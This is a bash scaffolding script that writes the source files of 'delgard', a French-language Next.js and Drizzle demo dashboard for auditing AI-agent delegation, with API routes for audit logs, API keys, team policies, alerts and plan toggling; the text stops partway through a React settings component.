#!/usr/bin/env bash
set -e
mkdir -p /workspaces/delgard-dashboard
cd /workspaces/delgard-dashboard

cat > "drizzle.config.json" << 'DELGARD_FILE_EOF_9f3a2b'
{
  "dialect": "postgresql",
  "schema": "./src/db/schema.ts",
  "dbCredentials": {
    "url": "postgresql://postgres:postgres@127.0.0.1:5432/app_db"
  }
}
DELGARD_FILE_EOF_9f3a2b

cat > "eslint.config.mjs" << 'DELGARD_FILE_EOF_9f3a2b'
import { defineConfig, globalIgnores } from "eslint/config";
import nextCoreWebVitals from "eslint-config-next/core-web-vitals";

export default defineConfig([
  // Keep the starter on the flat config export that actually runs under the pinned ESLint/Next toolchain.
  ...nextCoreWebVitals,
  globalIgnores([".next/**", "out/**", "build/**", "next-env.d.ts"]),
]);
DELGARD_FILE_EOF_9f3a2b

cat > "next.config.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import type { NextConfig } from "next";

const nextConfig: NextConfig = {};

export default nextConfig;
DELGARD_FILE_EOF_9f3a2b

cat > "package.json" << 'DELGARD_FILE_EOF_9f3a2b'
{
  "name": "nextjs-postgresql-template",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "eslint .",
    "typecheck": "tsc --noEmit"
  },
  "dependencies": {
    "clsx": "^2.1.1",
    "dotenv": "17.3.1",
    "drizzle-orm": "0.45.2",
    "lucide-react": "^1.24.0",
    "next": "16.2.6",
    "pg": "8.20.0",
    "react": "19.2.6",
    "react-dom": "19.2.6",
    "tailwind-merge": "^3.6.0"
  },
  "devDependencies": {
    "@tailwindcss/postcss": "4.1.17",
    "@types/node": "22.19.15",
    "@types/pg": "8.18.0",
    "@types/react": "19.2.14",
    "@types/react-dom": "19.2.3",
    "drizzle-kit": "0.31.10",
    "eslint": "9.39.4",
    "eslint-config-next": "16.2.6",
    "postcss": "8.5.8",
    "tailwindcss": "4.1.17",
    "typescript": "5.9.3"
  }
}
DELGARD_FILE_EOF_9f3a2b

cat > "postcss.config.mjs" << 'DELGARD_FILE_EOF_9f3a2b'
const postcssConfig = {
  plugins: {
    "@tailwindcss/postcss": {},
  },
};

export default postcssConfig;
DELGARD_FILE_EOF_9f3a2b

mkdir -p "public"
cat > "public/logo-icon.svg" << 'DELGARD_FILE_EOF_9f3a2b'
<svg width="200" height="200" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#0B1220"/>
      <stop offset="100%" stop-color="#111C33"/>
    </linearGradient>
  </defs>
  <rect width="200" height="200" rx="40" fill="url(#bg)"/>
  <path d="M100,26 L157,50 L157,108
           C157,150 130,177 100,190
           C70,177 43,150 43,108
           L43,50 Z"
        fill="none" stroke="#2DD4BF" stroke-width="7" stroke-linejoin="round"/>
  <circle cx="76" cy="102" r="11" fill="#2DD4BF"/>
  <circle cx="124" cy="102" r="11" fill="#2DD4BF" fill-opacity="0.55"/>
  <line x1="87" y1="102" x2="108" y2="102" stroke="#2DD4BF" stroke-width="6" stroke-linecap="round"/>
  <path d="M104,94 L114,102 L104,110" fill="none" stroke="#2DD4BF" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
</svg>
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/alerts"
cat > "src/app/api/alerts/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { alertConfigs, profiles } from "@/db/schema";
import { eq, desc } from "drizzle-orm";
import { INITIAL_DEMO_USER, INITIAL_DEMO_TEAM } from "@/lib/seed-data";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    const profile = await db.query.profiles.findFirst({
      where: eq(profiles.id, INITIAL_DEMO_USER.id),
    });
    const plan = profile?.plan || "free";

    const alerts = await db.query.alertConfigs.findMany({
      where: eq(alertConfigs.userId, INITIAL_DEMO_USER.id),
      orderBy: [desc(alertConfigs.createdAt)],
    });

    return Response.json({
      alerts,
      plan,
      isLocked: plan === "free",
      ok: true,
    });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to fetch alerts" }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    const profile = await db.query.profiles.findFirst({
      where: eq(profiles.id, INITIAL_DEMO_USER.id),
    });

    if (profile?.plan !== "pro") {
      return Response.json(
        {
          error: "Fonctionnalité réservée au plan Pro. Passez Pro pour configurer des alertes automatiques Slack et Email.",
          code: "PRO_REQUIRED",
        },
        { status: 403 }
      );
    }

    const { channel, target, triggerOn = ["block", "approval-required"] } = await req.json();

    if (!channel || (channel !== "email" && channel !== "slack")) {
      return Response.json({ error: "Invalid channel. Must be 'email' or 'slack'" }, { status: 400 });
    }
    if (!target) {
      return Response.json({ error: "Target (email or webhook URL) is required" }, { status: 400 });
    }

    const [newAlert] = await db
      .insert(alertConfigs)
      .values({
        userId: INITIAL_DEMO_USER.id,
        teamId: INITIAL_DEMO_TEAM.id,
        channel,
        target,
        triggerOn,
      })
      .returning();

    return Response.json({ success: true, alert: newAlert });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to create alert config" }, { status: 500 });
  }
}

export async function DELETE(req: Request) {
  try {
    const url = new URL(req.url);
    const id = url.searchParams.get("id");

    if (!id) {
      return Response.json({ error: "Missing alert id" }, { status: 400 });
    }

    await db.delete(alertConfigs).where(eq(alertConfigs.id, id));

    return Response.json({ success: true, removedId: id });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to delete alert" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/audit"
cat > "src/app/api/audit/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { auditEntries, profiles } from "@/db/schema";
import { eq, desc } from "drizzle-orm";
import { INITIAL_DEMO_USER } from "@/lib/seed-data";

export const dynamic = "force-dynamic";

export async function GET(req: Request) {
  try {
    const url = new URL(req.url);
    const decisionFilter = url.searchParams.get("decision") || "all";
    const subjectFilter = url.searchParams.get("subject") || "";
    const search = url.searchParams.get("search") || "";

    // Get user profile plan
    const profile = await db.query.profiles.findFirst({
      where: eq(profiles.id, INITIAL_DEMO_USER.id),
    });
    const plan = profile?.plan || "free";

    // Fetch all audit entries for user sorted chronologically (newest first)
    const allEntries = await db.query.auditEntries.findMany({
      where: eq(auditEntries.userId, INITIAL_DEMO_USER.id),
      orderBy: [desc(auditEntries.occurredAt)],
    });

    // Apply decision, subject, and search filters
    const filteredEntries = allEntries.filter((entry) => {
      if (decisionFilter !== "all" && entry.decision !== decisionFilter) {
        return false;
      }
      if (subjectFilter && subjectFilter !== "all" && entry.subject !== subjectFilter) {
        return false;
      }
      if (search) {
        const q = search.toLowerCase();
        const matchesAction = entry.action?.toLowerCase().includes(q);
        const matchesSubject = entry.subject?.toLowerCase().includes(q);
        const matchesIssuer = entry.issuer?.toLowerCase().includes(q);
        const matchesReason = entry.reason?.toLowerCase().includes(q);
        if (!matchesAction && !matchesSubject && !matchesIssuer && !matchesReason) {
          return false;
        }
      }
      return true;
    });

    const totalMatchingCount = filteredEntries.length;
    let entries = filteredEntries;
    let hasOlderTruncated = false;
    let truncatedCount = 0;

    if (plan === "free") {
      const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
      const withinSevenDays = filteredEntries.filter(
        (e) => new Date(e.occurredAt) >= sevenDaysAgo
      );

      if (withinSevenDays.length < filteredEntries.length) {
        hasOlderTruncated = true;
        truncatedCount = filteredEntries.length - withinSevenDays.length;
        entries = withinSevenDays;
      }

      // Also limit to 1000
      if (entries.length > 1000) {
        hasOlderTruncated = true;
        truncatedCount += entries.length - 1000;
        entries = entries.slice(0, 1000);
      }
    }

    // Get unique subjects for filter dropdowns
    const uniqueSubjects = Array.from(new Set(allEntries.map((e) => e.subject).filter(Boolean)));

    return Response.json({
      entries,
      totalCount: totalMatchingCount,
      hasOlderTruncated,
      truncatedCount,
      plan,
      uniqueSubjects,
      ok: true,
    });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to fetch audit entries" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/health"
cat > "src/app/api/health/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { sql } from "drizzle-orm";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    await db.execute(sql`select 1`);
    return Response.json({ ok: true });
  } catch {
    return Response.json({ ok: false }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/init"
cat > "src/app/api/init/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { users, profiles, teams, teamMembers, sharedPolicies, alertConfigs } from "@/db/schema";
import { ensureDbAndSeed } from "@/lib/db-init";
import { eq } from "drizzle-orm";
import { INITIAL_DEMO_USER } from "@/lib/seed-data";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    await ensureDbAndSeed();

    const user = await db.query.users.findFirst({
      where: eq(users.id, INITIAL_DEMO_USER.id),
    });

    if (!user) {
      return Response.json({ error: "User not found" }, { status: 404 });
    }

    const profile = await db.query.profiles.findFirst({
      where: eq(profiles.id, INITIAL_DEMO_USER.id),
    });

    const userTeams = await db.query.teams.findMany({
      where: eq(teams.ownerId, INITIAL_DEMO_USER.id),
    });

    return Response.json({
      user,
      profile: profile || { id: INITIAL_DEMO_USER.id, plan: "free" },
      teams: userTeams,
      ok: true,
    });
  } catch (error: any) {
    console.error("Error in /api/init:", error);
    return Response.json({ error: error?.message || "Initialization error" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/keys"
cat > "src/app/api/keys/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { apiKeys } from "@/db/schema";
import { eq, desc } from "drizzle-orm";
import { INITIAL_DEMO_USER } from "@/lib/seed-data";
import { hashSha256, generateRandomApiKey } from "@/lib/crypto";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    const keys = await db.query.apiKeys.findMany({
      where: eq(apiKeys.userId, INITIAL_DEMO_USER.id),
      orderBy: [desc(apiKeys.createdAt)],
    });

    return Response.json({ keys, ok: true });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to fetch API keys" }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const label = body.label?.trim() || "Untitled CLI Agent Guard";

    const { rawKey, prefix } = generateRandomApiKey();
    const keyHash = await hashSha256(rawKey);

    const [newKey] = await db
      .insert(apiKeys)
      .values({
        userId: INITIAL_DEMO_USER.id,
        keyHash,
        keyPrefix: prefix,
        label,
      })
      .returning();

    return Response.json({
      keyRecord: newKey,
      rawKeySecret: rawKey, // Returned exactly once to user!
      success: true,
    });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to create API key" }, { status: 500 });
  }
}

export async function DELETE(req: Request) {
  try {
    const url = new URL(req.url);
    const id = url.searchParams.get("id");

    if (!id) {
      return Response.json({ error: "Missing key ID" }, { status: 400 });
    }

    await db.delete(apiKeys).where(eq(apiKeys.id, id));

    return Response.json({ success: true, revokedId: id });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to revoke API key" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/reset-demo"
cat > "src/app/api/reset-demo/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { seedDatabase } from "@/lib/db-init";

export const dynamic = "force-dynamic";

export async function POST() {
  try {
    await seedDatabase(true);
    return Response.json({ success: true, message: "Demo data reset successfully." });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to reset demo data" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/sync-audit"
cat > "src/app/api/sync-audit/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { apiKeys, auditEntries } from "@/db/schema";
import { eq } from "drizzle-orm";
import { hashSha256 } from "@/lib/crypto";

export const dynamic = "force-dynamic";

export async function POST(req: Request) {
  try {
    const authHeader = req.headers.get("Authorization") || "";
    const match = authHeader.match(/^Bearer\s+(.+)$/i);

    if (!match || !match[1]) {
      return Response.json(
        {
          error: "Unauthorized: Missing or invalid Authorization header. Expected 'Bearer <your_api_key>'",
          code: "MISSING_API_KEY",
        },
        { status: 401 }
      );
    }

    const rawApiKey = match[1].trim();
    const keyHash = await hashSha256(rawApiKey);

    const apiKeyRecord = await db.query.apiKeys.findFirst({
      where: eq(apiKeys.keyHash, keyHash),
    });

    if (!apiKeyRecord) {
      console.warn(`Attempted sync-audit with invalid key hash: ${keyHash.substring(0, 8)}...`);
      return Response.json(
        {
          error: "Unauthorized: Invalid API key. Please generate a valid key from your Delgard Dashboard.",
          code: "INVALID_API_KEY",
        },
        { status: 401 }
      );
    }

    const userId = apiKeyRecord.userId;

    // Update lastUsedAt
    await db
      .update(apiKeys)
      .set({ lastUsedAt: new Date() })
      .where(eq(apiKeys.id, apiKeyRecord.id));

    const body = await req.json();
    const entries = Array.isArray(body) ? body : Array.isArray(body.entries) ? body.entries : [body];

    if (!entries || entries.length === 0) {
      return Response.json({ error: "Bad Request: No audit entries provided in request body." }, { status: 400 });
    }

    const recordsToInsert = await Promise.all(
      entries.map(async (entry: any) => ({
        userId,
        entryHash: entry.entry_hash || entry.hash || await hashSha256(JSON.stringify(entry) + Date.now()),
        prevHash: entry.prev_hash || null,
        issuer: entry.issuer || "Delgard-CLI",
        subject: entry.subject || "agent-runtime",
        action: entry.action || "unknown",
        decision: entry.decision || "allow",
        reason: entry.reason || null,
        occurredAt: entry.occurred_at ? new Date(entry.occurred_at) : new Date(),
      }))
    );

    const insertedData = await db
      .insert(auditEntries)
      .values(recordsToInsert)
      .returning({ id: auditEntries.id, decision: auditEntries.decision, action: auditEntries.action });

    return Response.json({
      success: true,
      synchronized_count: recordsToInsert.length,
      user_id: userId,
      api_key_label: apiKeyRecord.label || "Untitled Key",
      entries: insertedData,
    });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Internal Server Error" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/team/member"
cat > "src/app/api/team/member/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { teamMembers, profiles, users } from "@/db/schema";
import { eq } from "drizzle-orm";
import { INITIAL_DEMO_USER, INITIAL_DEMO_TEAM } from "@/lib/seed-data";

export const dynamic = "force-dynamic";

export async function POST(req: Request) {
  try {
    const profile = await db.query.profiles.findFirst({
      where: eq(profiles.id, INITIAL_DEMO_USER.id),
    });

    if (profile?.plan !== "pro") {
      return Response.json(
        { error: "Entitlement error: Team collaboration is available on Pro plan only.", code: "PRO_REQUIRED" },
        { status: 403 }
      );
    }

    const { email, role = "member" } = await req.json();

    if (!email) {
      return Response.json({ error: "Email is required" }, { status: 400 });
    }

    // Check if user exists or create a placeholder invitee user
    let inviteUser = await db.query.users.findFirst({
      where: eq(users.email, email),
    });

    if (!inviteUser) {
      const [newInvite] = await db
        .insert(users)
        .values({
          email,
          name: email.split("@")[0],
          avatarUrl: `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(email)}`,
        })
        .returning();
      inviteUser = newInvite;
    }

    await db
      .insert(teamMembers)
      .values({
        teamId: INITIAL_DEMO_TEAM.id,
        userId: inviteUser.id,
        role,
      })
      .onConflictDoUpdate({
        target: [teamMembers.teamId, teamMembers.userId],
        set: { role },
      });

    return Response.json({ success: true, newMember: inviteUser });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to add member" }, { status: 500 });
  }
}

export async function DELETE(req: Request) {
  try {
    const url = new URL(req.url);
    const userId = url.searchParams.get("userId");

    if (!userId) {
      return Response.json({ error: "Missing userId" }, { status: 400 });
    }

    await db
      .delete(teamMembers)
      .where(eq(teamMembers.userId, userId));

    return Response.json({ success: true, removedId: userId });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to remove member" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/team"
cat > "src/app/api/team/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { teams, teamMembers, sharedPolicies, profiles, users } from "@/db/schema";
import { eq } from "drizzle-orm";
import { INITIAL_DEMO_USER, INITIAL_DEMO_TEAM } from "@/lib/seed-data";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    const profile = await db.query.profiles.findFirst({
      where: eq(profiles.id, INITIAL_DEMO_USER.id),
    });
    const plan = profile?.plan || "free";

    const team = await db.query.teams.findFirst({
      where: eq(teams.id, INITIAL_DEMO_TEAM.id),
    });

    const members = await db
      .select({
        teamId: teamMembers.teamId,
        userId: teamMembers.userId,
        role: teamMembers.role,
        name: users.name,
        email: users.email,
        avatarUrl: users.avatarUrl,
      })
      .from(teamMembers)
      .innerJoin(users, eq(teamMembers.userId, users.id))
      .where(eq(teamMembers.teamId, INITIAL_DEMO_TEAM.id));

    const policy = await db.query.sharedPolicies.findFirst({
      where: eq(sharedPolicies.teamId, INITIAL_DEMO_TEAM.id),
    });

    return Response.json({
      team,
      members,
      policy: policy || { yamlContent: "" },
      plan,
      isLocked: plan === "free",
      ok: true,
    });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to fetch team data" }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    const profile = await db.query.profiles.findFirst({
      where: eq(profiles.id, INITIAL_DEMO_USER.id),
    });

    if (profile?.plan !== "pro") {
      return Response.json(
        {
          error: "Fonctionnalité réservée au plan Pro. Passez au plan Pro pour modifier et synchroniser agenttrust.yml en équipe.",
          code: "PRO_REQUIRED",
        },
        { status: 403 }
      );
    }

    const { yamlContent } = await req.json();

    if (!yamlContent) {
      return Response.json({ error: "Missing YAML content" }, { status: 400 });
    }

    await db
      .insert(sharedPolicies)
      .values({
        teamId: INITIAL_DEMO_TEAM.id,
        yamlContent,
        updatedBy: INITIAL_DEMO_USER.id,
        updatedAt: new Date(),
      })
      .onConflictDoUpdate({
        target: sharedPolicies.id,
        set: {
          yamlContent,
          updatedBy: INITIAL_DEMO_USER.id,
          updatedAt: new Date(),
        },
      });

    return Response.json({ success: true, updatedAt: new Date().toISOString() });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to save policy" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app/api/user/plan"
cat > "src/app/api/user/plan/route.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import { profiles } from "@/db/schema";
import { eq } from "drizzle-orm";
import { INITIAL_DEMO_USER } from "@/lib/seed-data";

export const dynamic = "force-dynamic";

export async function POST(req: Request) {
  try {
    const { plan } = await req.json();

    if (plan !== "free" && plan !== "pro") {
      return Response.json({ error: "Invalid plan. Must be 'free' or 'pro'" }, { status: 400 });
    }

    await db
      .update(profiles)
      .set({ plan })
      .where(eq(profiles.id, INITIAL_DEMO_USER.id));

    return Response.json({ success: true, plan });
  } catch (error: any) {
    return Response.json({ error: error?.message || "Failed to update plan" }, { status: 500 });
  }
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app"
cat > "src/app/globals.css" << 'DELGARD_FILE_EOF_9f3a2b'
@import "tailwindcss";

:root {
  /* --- delgard design tokens --- */
  --bg-base: #0b1220;
  --bg-raised: #111c33;
  --bg-inset: #060a14;
  --border-hair: #1e2940;
  --accent: #2dd4bf;
  --accent-dim: #1b8f82;
  --text-primary: #eef2f7;
  --text-muted: #8b98ac;
  --danger: #f87171;
  --warning: #fbbf24;

  --font-sans: var(--font-plex-sans), "IBM Plex Sans", ui-sans-serif, system-ui, sans-serif;
  --font-mono: var(--font-plex-mono), "IBM Plex Mono", ui-monospace, "SFMono-Regular", Menlo, monospace;
}

@layer base {
  body {
    background-color: var(--bg-base);
    color: var(--text-primary);
    font-family: var(--font-sans);
    font-feature-settings: "ss01" 1;
  }

  code, pre, .font-data {
    font-family: var(--font-mono);
    font-feature-settings: "zero" 1;
  }

  h1, h2, h3 {
    letter-spacing: -0.01em;
  }

  /* visible keyboard focus, not just a color-only ring */
  :focus-visible {
    outline: 2px solid var(--accent);
    outline-offset: 2px;
  }
}

@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
  }
}

/* Subtle scrollbars for code boxes & tables */
::-webkit-scrollbar {
  width: 8px;
  height: 8px;
}
::-webkit-scrollbar-track {
  background: var(--bg-base);
}
::-webkit-scrollbar-thumb {
  background: var(--border-hair);
  border-radius: 4px;
}
::-webkit-scrollbar-thumb:hover {
  background: var(--accent-dim);
}

/* --- Signature element: hash-chain connector ---
   A thin linking rule used to visually tie a row of the audit
   ledger to the one before it, echoing delgard's own hash-chained
   log. Applied via the .chain-link utility. */
.chain-link {
  position: relative;
}
.chain-link::before {
  content: "";
  position: absolute;
  left: 0;
  top: 0;
  bottom: 0;
  width: 2px;
  background: linear-gradient(to bottom, transparent, var(--accent-dim) 20%, var(--accent-dim) 80%, transparent);
  opacity: 0.5;
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app"
cat > "src/app/layout.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
import type { Metadata } from "next";
import type { ReactNode } from "react";
import { IBM_Plex_Sans, IBM_Plex_Mono } from "next/font/google";
import "./globals.css";

const plexSans = IBM_Plex_Sans({
  subsets: ["latin"],
  weight: ["400", "500", "600", "700"],
  variable: "--font-plex-sans",
  display: "swap",
});

const plexMono = IBM_Plex_Mono({
  subsets: ["latin"],
  weight: ["400", "500", "600"],
  variable: "--font-plex-mono",
  display: "swap",
});

export const metadata: Metadata = {
  title: "delgard — Dashboard d'audit multi-agents",
  description:
    "Dashboard hébergé complémentaire à la librairie open-source delgard : journal d'audit, policy d'équipe et clés API pour la délégation agent → agent.",
  icons: {
    icon: "/logo-icon.svg",
  },
};

export default function RootLayout({ children }: { children: ReactNode }) {
  return (
    <html lang="fr" className={`dark ${plexSans.variable} ${plexMono.variable}`}>
      <body className="bg-[#0B1220] text-[#EEF2F7] antialiased min-h-screen">
        {children}
      </body>
    </html>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/app"
cat > "src/app/page.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React, { useState, useEffect } from "react";
import { Navbar } from "@/components/Navbar";
import { LoginModal } from "@/components/LoginModal";
import { AuditLogView } from "@/components/AuditLogView";
import { ApiKeysView } from "@/components/ApiKeysView";
import { TeamPolicyView } from "@/components/TeamPolicyView";
import { AlertsView } from "@/components/AlertsView";
import { AccountSettingsView } from "@/components/AccountSettingsView";
import { DeploymentKitView } from "@/components/DeploymentKitView";
import { INITIAL_DEMO_USER } from "@/lib/seed-data";

export default function DelgardDashboardPage() {
  const [activeTab, setActiveTab] = useState<string>("audit");
  const [user, setUser] = useState<any>(INITIAL_DEMO_USER);
  const [plan, setPlan] = useState<string>("free");
  const [loading, setLoading] = useState(true);
  const [isLoginOpen, setIsLoginOpen] = useState(false);
  const [isResetting, setIsResetting] = useState(false);
  const [toast, setToast] = useState<string | null>(null);

  const fetchInitialSession = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/init");
      const data = await res.json();
      if (data.ok) {
        if (data.user) setUser(data.user);
        if (data.profile) setPlan(data.profile.plan || "free");
      }
    } catch (err) {
      console.error("Failed to fetch initial session:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchInitialSession();
  }, []);

  const handleTogglePlan = async (newPlan: string) => {
    try {
      const res = await fetch("/api/user/plan", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ plan: newPlan }),
      });
      const data = await res.json();
      if (data.success) {
        setPlan(newPlan);
        showToast(`Plan changé vers : ${newPlan.toUpperCase()}`);
      }
    } catch (err) {
      console.error("Failed to change plan:", err);
    }
  };

  const handleResetDemo = async () => {
    setIsResetting(true);
    try {
      const res = await fetch("/api/reset-demo", { method: "POST" });
      const data = await res.json();
      if (data.success) {
        await fetchInitialSession();
        showToast("Données de démo réinitialisées (12 logs d'audit et clés rechargés !)");
      }
    } catch (err) {
      console.error("Reset error:", err);
    } finally {
      setIsResetting(false);
    }
  };

  const handleSimulateLogin = (provider: string, email?: string) => {
    if (email) {
      setUser({
        ...user,
        email,
        name: email.split("@")[0],
        avatarUrl: `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(email)}`,
        provider: "email",
      });
    } else {
      setUser({
        ...user,
        provider,
        name: provider === "github" ? "Alex Rivera (GitHub Auth)" : "Alex Rivera (Google Auth)",
      });
    }
    showToast(`Session Supabase Auth synchronisée (${provider.toUpperCase()})`);
  };

  const showToast = (message: string) => {
    setToast(message);
    setTimeout(() => setToast(null), 3500);
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#0B1220] text-slate-100 selection:bg-teal-500/30 selection:text-teal-200">
      {/* Sticky Navigation */}
      <Navbar
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        user={user}
        plan={plan}
        onTogglePlan={handleTogglePlan}
        onResetDemo={handleResetDemo}
        isResetting={isResetting}
        onOpenLogin={() => setIsLoginOpen(true)}
      />

      {/* Main Content Area */}
      <main className="flex-1 max-w-7xl w-full mx-auto px-4 lg:px-8 py-8">
        {activeTab === "audit" && (
          <AuditLogView
            plan={plan}
            onTogglePlan={handleTogglePlan}
            onNavigateToKeys={() => setActiveTab("keys")}
          />
        )}

        {activeTab === "keys" && (
          <ApiKeysView
            onRefreshLogs={() => {
              showToast("Nouveau log synchronisé depuis le simulateur CLI !");
            }}
          />
        )}

        {activeTab === "team" && (
          <TeamPolicyView plan={plan} onTogglePlan={handleTogglePlan} />
        )}

        {activeTab === "alerts" && (
          <AlertsView plan={plan} onTogglePlan={handleTogglePlan} />
        )}

        {activeTab === "account" && (
          <AccountSettingsView user={user} plan={plan} onTogglePlan={handleTogglePlan} />
        )}

        {activeTab === "deploy" && <DeploymentKitView />}
      </main>

      {/* Footer */}
      <footer className="border-t border-[#1E293B] bg-[#0B1220] py-6 px-4 lg:px-8 mt-12 text-center text-xs text-slate-500">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2 font-medium text-slate-400">
            <img src="/logo-icon.svg" alt="" className="w-4 h-4 rounded" />
            <span className="w-1.5 h-1.5 rounded-full bg-teal-400 animate-pulse" />
            <span>delgard — dashboard d'audit</span>
          </div>
          <div className="flex items-center gap-6">
            <button onClick={() => setActiveTab("deploy")} className="hover:text-teal-400 transition-colors">
              Kit de déploiement
            </button>
            <a href="https://github.com/delgard-founder/delgard" target="_blank" rel="noreferrer" className="hover:text-teal-400 transition-colors">
              GitHub
            </a>
            <a href="https://www.npmjs.com/package/delgard" target="_blank" rel="noreferrer" className="hover:text-teal-400 transition-colors">
              npm
            </a>
            <button onClick={() => setActiveTab("account")} className="hover:text-teal-400 transition-colors">
              Compte
            </button>
          </div>
          <div className="text-slate-600">
            © 2026 delgard — open-source, sous licence MIT.
          </div>
        </div>
      </footer>

      {/* Human Authentication Modal (Supabase Auth) */}
      <LoginModal
        isOpen={isLoginOpen}
        onClose={() => setIsLoginOpen(false)}
        currentUser={user}
        onSimulateLogin={handleSimulateLogin}
      />

      {/* Toast Notification */}
      {toast && (
        <div className="fixed bottom-6 right-6 z-50 bg-[#111C33] border border-teal-500/40 text-teal-300 px-5 py-3 rounded-md shadow-2xl font-bold text-xs flex items-center gap-2.5 animate-in slide-in-from-bottom-5 duration-200">
          <span className="w-2 h-2 rounded-full bg-teal-400 animate-ping" />
          <span>{toast}</span>
        </div>
      )}
    </div>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/components"
cat > "src/components/AccountSettingsView.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React, { useState } from "react";
import {
  Settings,
  Shield,
  Zap,
  CheckCircle2,
  Lock,
  Mail,
  User,
  ExternalLink,
  Sparkles,
  Database,
  ArrowRight,
} from "lucide-react";
import clsx from "clsx";

interface AccountSettingsViewProps {
  user: any;
  plan: string;
  onTogglePlan: (newPlan: string) => void;
}

export function AccountSettingsView({ user, plan, onTogglePlan }: AccountSettingsViewProps) {
  const [contactSent, setContactSent] = useState(false);

  const handleContactSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setContactSent(true);
    setTimeout(() => setContactSent(false), 5000);
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-300 max-w-5xl mx-auto">
      {/* Header */}
      <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl flex items-center justify-between">
        <div>
          <h1 className="text-xl font-semibold text-white flex items-center gap-2">
            <Settings className="w-5 h-5 text-teal-400" />
            <span>Paramètres de votre compte Delgard</span>
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            Gérez votre profil Supabase Auth, votre plan d&apos;abonnement et vos préférences d&apos;environnement.
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        {/* Current User Profile Box */}
        <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl h-fit space-y-4">
          <h2 className="text-sm font-semibold text-white uppercase tracking-wider text-slate-400">
            Profil Utilisateur (Supabase Auth)
          </h2>

          <div className="flex items-center gap-4 py-2 border-b border-slate-800">
            {user?.avatarUrl ? (
              <img src={user.avatarUrl} alt={user.name} className="w-14 h-14 rounded-lg object-cover border-2 border-teal-500/50" />
            ) : (
